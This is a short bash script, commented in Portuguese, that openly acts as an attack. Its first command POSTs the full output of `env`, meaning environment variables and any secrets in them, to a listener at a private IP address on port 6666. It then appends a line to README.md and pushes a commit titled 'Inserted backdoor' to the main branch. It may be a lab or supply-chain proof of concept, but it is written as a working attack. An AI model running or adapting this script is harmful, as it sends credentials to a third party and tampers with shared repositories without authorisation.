#!/bin/bash
# Exfiltra segredos e variáveis de ambiente
curl -X POST -d "$(env)" http://192.168.220.128:6666

# Adiciona código malicioso no repositório base
echo "Backdoor inserted" >> README.md
git add README.md
git commit -m "Inserted backdoor"
git push origin main
